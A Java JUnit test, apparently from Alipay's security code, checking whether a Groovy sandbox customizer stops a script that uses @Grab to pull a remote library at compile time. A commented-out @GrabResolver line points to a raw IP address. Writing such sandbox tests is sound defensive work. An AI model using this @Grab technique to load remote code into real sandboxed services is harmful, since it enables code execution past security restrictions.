/**
 * Alipay.com Inc. Copyright (c) 2004-2020 All Rights Reserved.
 */

import com.mybank.security.groovy.GroovySandboxExpressionChecker;
import groovy.lang.GroovyClassLoader;
import groovy.lang.GroovyObject;
import org.codehaus.groovy.control.CompilerConfiguration;
import org.junit.Test;

/**
 *
 * @author th1s
 * @version : GroovySandboxTest.java, v 0.1 2020年08月03日 5:23 下午 th1s Exp $
 */
public class GroovySandboxTest {
    @Test
    public void test1() throws Exception {
        CompilerConfiguration config = new CompilerConfiguration();
        config.addCompilationCustomizers(GroovySandboxExpressionChecker.getSecureASTCustomizer());
        GroovyClassLoader loader =  new GroovyClassLoader(Thread.currentThread().getContextClassLoader(),config);

        Class clazz = loader.parseClass(" "
                //+ "@GrabResolver(name='restlet', root='http://http://30.52.96.136:2333/')\n"
                + "@Grab(group='org.restlet', module='org.restlet', version='1.1.6')"
                + "def cycle(){\n" +
                "    }");

        GroovyObject instance = (GroovyObject) clazz.newInstance();
        instance.invokeMethod("cycle",null);
    }
}